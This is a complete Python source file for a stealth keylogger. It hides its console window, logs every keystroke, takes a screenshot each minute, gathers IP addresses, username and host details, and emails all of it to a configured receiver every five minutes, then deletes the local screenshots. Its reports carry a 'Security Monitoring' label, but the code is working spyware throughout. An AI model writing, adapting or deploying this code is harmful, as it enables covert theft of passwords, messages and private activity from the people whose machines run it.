import threading
import time
import os
import sys
import subprocess
from datetime import datetime
from pynput import keyboard
import yagmail
import pygetwindow as gw
import psutil
import requests
from PIL import ImageGrab
import platform
import socket

# ========== CONFIGURATION ==========
try:
    import config
    EMAIL_ADDRESS = config.EMAIL_ADDRESS
    EMAIL_PASSWORD = config.EMAIL_PASSWORD
    RECEIVER_EMAIL = config.RECEIVER_EMAIL
    SCREENSHOT_INTERVAL = getattr(config, 'SCREENSHOT_INTERVAL', 60)
    EMAIL_INTERVAL = getattr(config, 'EMAIL_INTERVAL', 300)
    BUFFER_SIZE = getattr(config, 'BUFFER_SIZE', 100)
except ImportError:
    EMAIL_ADDRESS = "your_email@gmail.com"
    EMAIL_PASSWORD = "your_app_password"
    RECEIVER_EMAIL = "receiver_email@domain.com"
    SCREENSHOT_INTERVAL = 60      # Screenshot every 60 seconds (1 minute)
    EMAIL_INTERVAL = 300           # Email every 300 seconds (5 minutes)
    BUFFER_SIZE = 100              # Keys buffer size

# ========== GLOBAL VARIABLES ==========
log_buffer = ""
key_count = 0
screenshots_queue = []         # Queue to store screenshot paths
last_email_time = time.time()
last_screenshot_time = time.time()

# ========== HIDE CONSOLE ==========
def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.FreeConsole()

# ========== GET IP ADDRESS ==========
def get_ip_addresses():
    """Get both public and local IP addresses"""
    ips = {'public': 'Unknown', 'local': 'Unknown'}
    
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            ips['public'] = response.text
    except:
        pass
    
    try:
        hostname = socket.gethostname()
        ips['local'] = socket.gethostbyname(hostname)
    except:
        pass
    
    return ips

# ========== GET SYSTEM INFO ==========
def get_system_info():
    """Collect detailed system information"""
    info = {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'username': os.environ.get('USERNAME', 'Unknown'),
        'os': platform.system() + " " + platform.release(),
        'architecture': platform.machine(),
        'cpu_percent': psutil.cpu_percent(interval=1),
        'ram_percent': psutil.virtual_memory().percent,
        'disk_usage': psutil.disk_usage('/').percent,
        'hostname': socket.gethostname()
    }
    return info

# ========== TAKE SCREENSHOT ==========
def take_screenshot():
    """Capture screenshot and return file path"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(os.getcwd(), f"screenshot_{timestamp}.png")
        
        # Take screenshot
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path, "PNG")
        
        return screenshot_path
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

# ========== FILE OPERATIONS ==========
def write_to_file(content):
    try:
        with open("key_logs.txt", "a", encoding="utf-8") as f:
            f.write(content)
            f.flush()
    except:
        pass

def add_to_log(char):
    global log_buffer, key_count
    log_buffer += char
    key_count += 1
    
    if key_count >= BUFFER_SIZE:
        flush_buffer()

def flush_buffer():
    global log_buffer, key_count
    if log_buffer:
        write_to_file(log_buffer)
        log_buffer = ""
        key_count = 0

def read_all_logs():
    """Read complete log file"""
    try:
        if os.path.exists("key_logs.txt"):
            with open("key_logs.txt", "r", encoding="utf-8") as f:
                return f.read()
    except:
        pass
    return ""

# ========== KEY HANDLER ==========
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            add_to_log(key.char)
        elif key == keyboard.Key.space:
            add_to_log(' ')
        elif key == keyboard.Key.enter:
            add_to_log('\n')
            flush_buffer()
        elif key == keyboard.Key.tab:
            add_to_log('    ')
        elif key == keyboard.Key.backspace:
            add_to_log('[⌫]')
        elif key == keyboard.Key.delete:
            add_to_log('[⌦]')
        elif key == keyboard.Key.up:
            add_to_log('[↑]')
        elif key == keyboard.Key.down:
            add_to_log('[↓]')
        elif key == keyboard.Key.left:
            add_to_log('[←]')
        elif key == keyboard.Key.right:
            add_to_log('[→]')
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            add_to_log('[^]')
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            add_to_log('[§]')
    except:
        pass

def on_release(key):
    pass

# ========== SCREENSHOT COLLECTOR ==========
def collect_screenshots():
    """Take screenshot every minute and add to queue"""
    global last_screenshot_time, screenshots_queue
    
    while True:
        time.sleep(1)  # Check every second
        
        current_time = time.time()
        if (current_time - last_screenshot_time) >= SCREENSHOT_INTERVAL:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Taking screenshot...")
            screenshot_path = take_screenshot()
            
            if screenshot_path and os.path.exists(screenshot_path):
                screenshots_queue.append(screenshot_path)
                write_to_file(f"\n[SCREENSHOT TAKEN at {datetime.now().strftime('%H:%M:%S')}]\n")
                print(f"✓ Screenshot saved: {os.path.basename(screenshot_path)} (Total in queue: {len(screenshots_queue)})")
            
            last_screenshot_time = current_time

# ========== HTML EMAIL GENERATION ==========
def generate_html_report(log_content, ip_info, sys_info, screenshot_count):
    """Generate beautiful HTML email with all info"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Clean log (last 3000 chars)
    clean_log = log_content[-3000:] if len(log_content) > 3000 else log_content
    if not clean_log:
        clean_log = "[No keystrokes captured in this period]"
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Monitoring Report</title>
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }}
        .header h1 {{
            margin: 0;
            font-size: 28px;
        }}
        .badge {{
            display: inline-block;
            background: #ff4757;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            margin-top: 10px;
        }}
        .section {{
            padding: 20px;
            border-bottom: 1px solid #e0e0e0;
        }}
        .section-title {{
            color: #667eea;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            padding-bottom: 5px;
            border-bottom: 2px solid #667eea;
        }}
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }}
        .info-card {{
            background: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            border-left: 3px solid #667eea;
        }}
        .info-card strong {{
            color: #667eea;
            display: block;
            margin-bottom: 5px;
            font-size: 12px;
        }}
        .info-card .value {{
            font-size: 16px;
            font-weight: bold;
        }}
        .stats-card {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }}
        .stats-card .number {{
            font-size: 32px;
            font-weight: bold;
        }}
        .keystrokes {{
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 400px;
            overflow-y: auto;
        }}
        .screenshot-gallery {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }}
        .screenshot-item {{
            background: #f8f9fa;
            border-radius: 8px;
            overflow: hidden;
            text-align: center;
            padding: 10px;
        }}
        .footer {{
            background: #f8f9fa;
            padding: 15px;
            text-align: center;
            color: #666;
            font-size: 11px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Security Monitoring Report</h1>
            <p>Automated System Audit Log</p>
            <div class="badge">⚠️ Authorized Monitoring Only</div>
        </div>
        
        <div class="section">
            <div class="section-title">🌐 Network & System Information</div>
            <div class="info-grid">
                <div class="info-card">
                    <strong>🌍 Public IP</strong>
                    <div class="value">{ip_info.get('public', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <strong>💻 Local IP</strong>
                    <div class="value">{ip_info.get('local', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <strong>🖥️ Computer Name</strong>
                    <div class="value">{sys_info.get('computer', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <strong>👤 Username</strong>
                    <div class="value">{sys_info.get('username', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <strong>💿 Operating System</strong>
                    <div class="value">{sys_info.get('os', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <strong>🔧 Architecture</strong>
                    <div class="value">{sys_info.get('architecture', 'Unknown')}</div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <div class="section-title">📊 System Statistics</div>
            <div class="info-grid">
                <div class="stats-card">
                    <div class="number">{sys_info.get('cpu_percent', 0)}%</div>
                    <div>CPU Usage</div>
                </div>
                <div class="stats-card">
                    <div class="number">{sys_info.get('ram_percent', 0)}%</div>
                    <div>RAM Usage</div>
                </div>
                <div class="stats-card">
                    <div class="number">{sys_info.get('disk_usage', 0)}%</div>
                    <div>Disk Usage</div>
                </div>
                <div class="stats-card">
                    <div class="number">{screenshot_count}</div>
                    <div>Screenshots</div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <div class="section-title">📝 Captured Keystrokes</div>
            <div class="keystrokes">
                {clean_log}
            </div>
        </div>
        
        <div class="section">
            <div class="section-title">📸 Screenshots Captured</div>
            <div class="screenshot-gallery">
                <div class="screenshot-item">
                    <strong>{screenshot_count} screenshot(s) attached</strong><br>
                    <small>Check attachments in this email</small>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>Report Generated: {timestamp}</p>
            <p>Monitoring Interval: Every 5 minutes | Screenshot Interval: Every 1 minute</p>
            <p>This is an automated security report</p>
        </div>
    </div>
</body>
</html>
    """
    
    return html

# ========== SEND EMAIL WITH ALL SCREENSHOTS ==========
def send_batch_email():
    """Send email with all collected screenshots and logs"""
    global screenshots_queue, last_email_time
    
    if not screenshots_queue:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] No screenshots to send, skipping email")
        return False
    
    print(f"\n{'='*50}")
    print(f"[{datetime.now().strftime('%H:%M:%S')}] Preparing batch email...")
    print(f"Screenshots to send: {len(screenshots_queue)}")
    
    try:
        # Get data
        log_content = read_all_logs()
        ip_info = get_ip_addresses()
        sys_info = get_system_info()
        
        # Generate HTML report
        html_content = generate_html_report(log_content, ip_info, sys_info, len(screenshots_queue))
        
        # Plain text version
        plain_text = f"""
SECURITY MONITORING REPORT
=======================================
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Computer: {sys_info['computer']}
User: {sys_info['username']}
Public IP: {ip_info['public']}
Local IP: {ip_info['local']}

SYSTEM STATUS:
- CPU: {sys_info['cpu_percent']}%
- RAM: {sys_info['ram_percent']}%
- Disk: {sys_info['disk_usage']}%

SCREENSHOTS: {len(screenshots_queue)} screenshot(s) attached

KEYSTROKES CAPTURED (last 2000 chars):
{log_content[-2000:] if log_content else 'No keystrokes'}

Total characters: {len(log_content)}
        """
        
        # Initialize email
        yag = yagmail.SMTP(EMAIL_ADDRESS, EMAIL_PASSWORD)
        
        # Subject
        subject = f"🛡️ Security Report - {sys_info['computer']} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ({len(screenshots_queue)} screenshots)"
        
        # Prepare attachments
        attachments = screenshots_queue.copy()
        
        # Send email
        print(f"📧 Sending email with {len(attachments)} attachment(s)...")
        yag.send(
            to=RECEIVER_EMAIL,
            subject=subject,
            contents=[plain_text, html_content] + attachments
        )
        
        yag.close()
        
        # Clean up - delete sent screenshots
        for screenshot in screenshots_queue:
            try:
                if os.path.exists(screenshot):
                    os.remove(screenshot)
                    print(f"  Deleted: {os.path.basename(screenshot)}")
            except:
                pass
        
        # Clear queue
        screenshots_queue = []
        last_email_time = time.time()
        
        # Log email sent
        write_to_file(f"\n[EMAIL SENT at {datetime.now()} - {len(attachments)} screenshots]\n")
        
        print(f"✅ Email sent successfully to {RECEIVER_EMAIL}")
        print(f"{'='*50}\n")
        
        return True
        
    except Exception as e:
        print(f"❌ Email error: {e}")
        write_to_file(f"\n[EMAIL ERROR: {str(e)}]\n")
        return False

# ========== EMAIL SCHEDULER ==========
def email_scheduler():
    """Send email every 5 minutes"""
    global last_email_time
    
    while True:
        time.sleep(10)  # Check every 10 seconds
        
        current_time = time.time()
        if (current_time - last_email_time) >= EMAIL_INTERVAL:
            if screenshots_queue:  # Only send if there are screenshots
                send_batch_email()
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] No screenshots in queue, waiting...")

# ========== TIMESTAMP ==========
def write_timestamp():
    ip_info = get_ip_addresses()
    sys_info = get_system_info()
    
    header = f"""
{'='*70}
🛡️ KEYLOGGER SESSION STARTED
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Computer: {sys_info['computer']}
User: {sys_info['username']}
Public IP: {ip_info['public']}
Local IP: {ip_info['local']}
Screenshot Interval: {SCREENSHOT_INTERVAL} seconds
Email Interval: {EMAIL_INTERVAL} seconds
{'='*70}

"""
    write_to_file(header)
    print(header)

def periodic_flush():
    while True:
        time.sleep(5)
        flush_buffer()

# ========== MAIN ==========
def run_keylogger():
    write_timestamp()
    
    # Start keyboard listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Start threads
    threading.Thread(target=periodic_flush, daemon=True).start()
    threading.Thread(target=collect_screenshots, daemon=True).start()
    threading.Thread(target=email_scheduler, daemon=True).start()
    
    print(f"✅ Keylogger is running!")
    print(f"   📸 Screenshot every {SCREENSHOT_INTERVAL} seconds")
    print(f"   📧 Email every {EMAIL_INTERVAL} seconds")
    print(f"   📁 Log file: key_logs.txt")
    print(f"\nPress Ctrl+C to stop...\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        flush_buffer()
        if screenshots_queue:
            print("\nSending final email...")
            send_batch_email()
        sys.exit(0)

if __name__ == "__main__":
    hide_console()
    run_keylogger()